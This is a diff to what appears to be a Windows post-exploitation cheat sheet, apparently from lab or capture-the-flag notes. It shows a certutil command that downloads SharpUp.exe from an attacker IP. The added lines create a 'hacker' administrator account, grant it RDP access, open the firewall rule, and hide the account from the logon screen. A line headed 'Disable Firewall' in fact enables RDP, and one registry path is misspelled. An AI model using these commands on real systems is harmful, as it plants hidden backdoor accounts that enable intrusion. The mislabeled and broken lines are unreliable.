@@ -103,3 +103,23 @@ wmic qfe list
 ```
 certutil -urlcache -f -split http://10.10.14.63:4321/SharpUp.exe sharpup.exe
 ```
+
+## Enable RDP 
+
+```
+net user /add hacker Password123!! 
+net localgroup administrators hacker /add
+net localgroup "Remote Desktop Users" hacker /add 
+netsh advfirewall firewall set rule group="remote desktop" new enable=Yes 
+```
+
+```
+reg add HKEY_LOCAL_MACHINE\Software\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\UserList /v hacker /t REG_DWORD /d 0
+```
+
+## Disable Firewall
+
+```
+Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server' -name "fDenyTSConnections" -value 0
+```
+
